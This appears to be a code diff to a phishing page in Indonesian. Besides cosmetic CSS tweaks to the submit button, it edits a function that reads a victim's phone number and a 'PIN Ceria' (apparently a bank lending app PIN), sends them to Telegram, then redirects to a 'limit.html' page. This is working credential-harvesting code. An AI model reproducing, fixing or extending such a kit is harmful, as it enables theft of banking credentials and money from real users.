@@ -47,9 +47,9 @@
     }
 
     .form-container input[type="Submit"] {
-      width: calc(90% - 8px);
+      width: calc(100% - 8px);
       max-width: 350px;
-      padding: 10px;
+      padding: 13px;
       border-radius: 5px;
       background-color: #663399;
       color: white;
@@ -89,10 +89,10 @@
     }
 
     function kirimPesan() {
-      var nomorHP = document.getElementById('𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲').value;
+      var nomorHP = document.getElementById('nomor_hp').value;
       var pin = document.getElementById('pin').value;
 
-      var message = "nomor_hp:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
+      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
       sendMessageToTelegram(message);
       window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html
     }
